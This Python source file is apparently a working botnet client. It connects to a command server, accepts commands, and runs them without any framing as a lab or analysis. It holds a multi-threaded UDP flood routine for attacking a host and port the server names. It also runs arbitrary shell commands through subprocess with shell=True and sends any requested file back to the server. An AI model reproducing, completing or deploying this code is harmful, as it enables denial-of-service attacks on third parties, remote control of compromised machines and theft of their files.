import subprocess
from tarfile import ENCODING
from threading import Thread, Timer
from time import sleep
import ctypes, socket, sys
import signal, inspect, os
from random import choice
from typing import Union, Tuple
import logging, hashlib

logging.basicConfig(level=logging.DEBUG, format="[%(asctime)s] [%(process)s] [%(levelname)s] %(message)s")
logg = logging.getLogger(__name__)

if os.name == "nt":
	ENCODING = "windows-1252"
else:
	ENCODING = "utf-8"

AUTHORIZATION = "" # (optnal) Set this to the authorization token you want to use
MAX_CHUNK_SIZE = 16 * 1024 # 16KB
POPEN_TIMEOUT = 60 # seconds

class Status:
	OK = "OK"
	FAIL = "FAIL"

class Request:
	def __init__(self, send:str="", status:str=Status.OK, body:Union[object, dict]=dict(), header:dict=dict()):
		self.header = {"status": status}

		if status == Status.FAIL:
			self.header["error"] = send

		if isinstance(body, dict):
			self.header["ct"] = "TEXT"

			if status == Status.FAIL:
				self.body = {"output": "", **body}
			else:
				self.body = {"output": send, **body}
		
		elif isinstance(body, bytes):
			self.header["ct"] = "BYTES"
			self.body = body
		
		elif isinstance(body, object):
			self.header["ct"] = "FILE"
			self.body = body

		self.header = {**self.header, **header}

	
	def __str__(self):
		return f"Request(header={self.header}, body={self.body})"
	
	def __repr__(self):
		return self.__str__()
	
	def set_header(self, key:str, value:str):
		self.header[key] = value
	
	def get_payload(self, encoding:str="utf-8") -> bytes:
		return (
			"\r\n".join(f"{key}: {value}" for key, value in self.header.items())
			+ "\r\n\r\n"
			+ "\r\n".join(f"{key}: {value}" for key, value in self.body.items())
		).encode(encoding)
	
	def __iter__(self):
		yield (
			"\r\n".join(f"{key}: {value}" for key, value in self.header.items())
			+ "\r\n\r\n"
		).encode("utf-8")

		if self.header["ct"] == "TEXT":
			yield (
				"\r\n".join(f"{key}: {value}" for key, value in self.body.items())
			).encode("utf-8")
		
		elif self.header["ct"] == "FILE":
			while data:=self.body.read(MAX_CHUNK_SIZE):
				yield data
		
		elif self.header["ct"] == "BYTES":
			yield self.body
		
		yield b'\x00\x00\xff\xff'

class Response:
	def __init__(self, payload:bytes, encoding:str="utf-8") -> None:
		self.raw_header, self.raw_body = payload.split(b"\r\n\r\n")
		self.header = {}
		self.body = {}

		for row in self.raw_header.decode(encoding).split("\r\n"):
			row_split_list = list(map(lambda x: x.strip(), row.split(":")))
			self.header[row_split_list[0]] = ":".join(row_split_list[1:]) or None

		for row in self.raw_body.decode(encoding).split("\r\n"):
			row_split_list = list(map(lambda x: x.strip(), row.split(":")))
			self.body[row_split_list[0]] = ":".join(row_split_list[1:]) or None
		

		self._direct = self.header["method"] == "DIRECT"
		self._connect = self.header["method"] == "CONNECT"

	def __str__(self):
		return f"Request(header={self.header}, body={self.body})"
	
	def __repr__(self):
		return self.__str__()

	@property
	def auth(self):
		return self.header.get("authorization")
	
	@property
	def cmd(self):
		return self.body.get("cmd")

	@property
	def params(self):
		return self.body.get("params")

	@property
	def ack(self):
		return self.body.get("ack")



class UDPFlood(Thread):
	def __init__(self, host:str, port:int, timeout:int, total_sent:object, run_until:object=True):
		super().__init__()
		self.host = host
		self.port = port
		self.timeout = timeout
		self.run_until = run_until
		self._closed = False

		self.total_sent_fn = total_sent
		self.total_sent = 0

		super().__init__()

		self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		self.sock.settimeout(self.timeout)

	def message(self):
		chunk = "A" * 1024 * 2
		self.total_sent_fn(len(chunk))
		self.total_sent += (len(chunk))
		return chunk

	def run(self):

		while self.run_until():
			self.sock.sendto(self.message().encode(), (self.host, self.port))
			logg.debug(f"Sent {self.total_sent} bytes to {self.host}:{self.port}")

		self.close()

	def close(self):
		self._closed = True
		self.sock.close()


class UDPFloodManager(Thread):
	def __init__(self, parent:object, host:str, port:int, timeout:int, max_threads:int, hash:str):
		self.parent = parent
		self.host = host
		self.port = port
		self.timeout = timeout
		self.max_threads = max_threads

		self.task_hash = hash
		self.run_until_local = True

		self._closed = False

		self.threads = []
		self.total_sent = 0

		super().__init__()
	
	def run_until_fn(self):
		if not self.run_until_local:
			return self.run_until_local
		
		if not self.parent.tasks.get(self.task_hash):
			return False

		return self.parent.tasks[self.task_hash].get("run")

	def update_data(self, n:int):
		self.total_sent += n

	def run(self):
		logg.debug(f"Starting UDPFloodManager for {self.host}:{self.port}")
		for _ in range(self.max_threads):
			thread = UDPFlood(self.host, self.port, self.timeout, self.update_data, self.run_until_fn)
			thread.start()
			self.threads.append(thread)

		current_loop = 0
		sleep_duration = 0.01
		max_loop = self.timeout / sleep_duration

		while current_loop <= max_loop:
			if not self.run_until_local:
				logg.debug("Stopping UDPFloodManager")
				break
			sleep(sleep_duration)
			current_loop += 1

		self.close()

	def close(self):
		logg.debug("Closing UDPFloodManager")
		self._closed = True
		self.run_until = False
		
		self.parent.tasks.pop(self.task_hash, None)


class Client():
	def __init__(self, addr:Tuple[str,int]=("127.0.0.1",8080)) -> None:
		signal.signal(signal.SIGINT, self.exit_gracefully)
		signal.signal(signal.SIGTERM, self.exit_gracefully)
		self.stop = False
		self.run = False


		self.tasks = {}

		self.direct = direct = {}
		for attr, func in inspect.getmembers(self):
			if attr.startswith("direct_"):
				direct[attr[7:].upper()] = func
		
		self.connect = connect = {}
		for attr, func in inspect.getmembers(self):
			if attr.startswith("connect_"):
				connect[attr[8:].upper()] = func


		while not self.stop:
			try:
				self._connect(addr)
			except KeyboardInterrupt:
				continue
			except Exception as ex:
				# trace = []
				# tb = ex.__traceback__
				# while tb is not None:
				# 	trace.append({
				# 		"filename": tb.tb_frame.f_code.co_filename,
				# 		"name": tb.tb_frame.f_code.co_name,
				# 		"lineno": tb.tb_lineno
				# 	})
				# 	tb = tb.tb_next
				# print(str({
				# 	'type': type(ex).__name__,
				# 	'message': str(ex)
				# }))

				# for n in trace:
				# 	print(n)

				print(f"Error connecting {addr}| Sleep 0 seconds")
				sleep(0)


		# self._connect(addr)
		# input("Press enter to exit")



	def exit_gracefully(self, signum, frame):
		print("\nExiting....")
		self.stop = True
		self.run = False
		self.conn.close()
		sleep(1)
		sys.exit(0)

	def _connect(self, connect:Tuple[str,int]) -> None:
		self.conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.conn.connect(connect)
		self.start()

	def send(self, req:Request) -> None:
		for payload in req:
			self.conn.send(payload)


	def recv(self) -> Response:
		data = self.conn.recv(MAX_CHUNK_SIZE)
		if not data:
			return None

		res = Response(data)

		return res

	def start(self) -> None:
		while True:
			response = self.recv()

			cmd = response.cmd
			ack = response.cmd
			params = response.params.split(" ") if response.params else response.params

			if response._direct:
				self.method_direct(cmd, ack, params)
			
			elif response._connect:
				self.method_connect(cmd, ack, params)

			else:
				print("Invalid command")
	

	def method_direct(self, cmd:str, ack:str, params:str) -> None:
		if cmd in self.direct:
			self.direct[cmd](ack, params)
		else:
			print("Invalid command")
	
	def direct_attack(self, ack:str, params:str) -> None:
		host, port, timeout, threads = params

		port = int(port)
		timeout = int(timeout)
		threads = int(threads)

		hash = self.get_hash("ATTACK", params)

		self.tasks[hash] = dict(run=True)

		manager = UDPFloodManager(self, host, port, timeout, threads, hash)
		manager.start()

		self.tasks[hash]["manager"] = manager

		if ack:
			self.send(Request("Task started successfully {}".format(hash)))
	
	def direct_ping(self, ack:str, params:str) -> None:
		if ack:
			self.send(Request("Pong"))
	
	def direct_kill(self, ack:str, params:str) -> None:
		hash = int(params[0])
		if hash in self.tasks:
			self.tasks[hash]["manager"].run_until_local = False
			if ack:
				self.send(Request("Task killed successfully {}".format(hash)))
		else:
			if ack:
				self.send(Request("Task not found {}".format(hash)))
	
	def direct_stop(self, ack:str, params:str) -> None:
		for hash in self.tasks:
			self.tasks[hash]["manager"].run_until_local = False
		
		if ack:
			self.send(Request("All tasks killed successfully"))

	def direct_destroy(self, ack:str, params:str) -> None:
		for hash in self.tasks:
			self.tasks[hash]["manager"].run_until_local = False
		if ack:
			self.send(Request("Shutting down"))
		
		self.exit_gracefully(None, None)

	def method_connect(self, cmd:str, ack:str, params:str) -> None:
		if cmd in self.connect:
			self.connect[cmd](ack, params)
		else:
			self.send(Request("Invalid command"))
	
	def connect_shell(self, ack:str, params:str) -> None:
		output = self.popen(cmd=params)
		if ack:
			self.send(Request(body=output))

	def connect_download(self, ack:str, params:str) -> None:
		file = params[0]
		if os.path.exists(file):
			with open(file, "rb") as fp:
				self.send(Request(body=fp))
				return

		self.send(Request(f"File {file} Not found.", status=Status.FAIL))

	

	def popen(self, cmd: list) -> str:
		process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
		timer = Timer(POPEN_TIMEOUT, process.terminate)
		try:
			timer.start()
			stdout, stderr = process.communicate()
			output = stdout or stderr
		finally:
			timer.cancel()

		final_output = output.replace(b"\r\n", b"\n").decode(encoding="windows-1252").encode()
		return final_output

	def get_hash(self, *args):
		data = []
		if len(args) > 1:
			for n in args:
				if isinstance(n, str):
					data.append(n)

				if isinstance(n, (tuple, list, set)):
					data += [*list(n)]
		else:
			data = args

		he = hashlib.md5(str(data).encode()).hexdigest()
		return (int(he, 16) % (1<<32))




if __name__ == "__main__":
	Client()
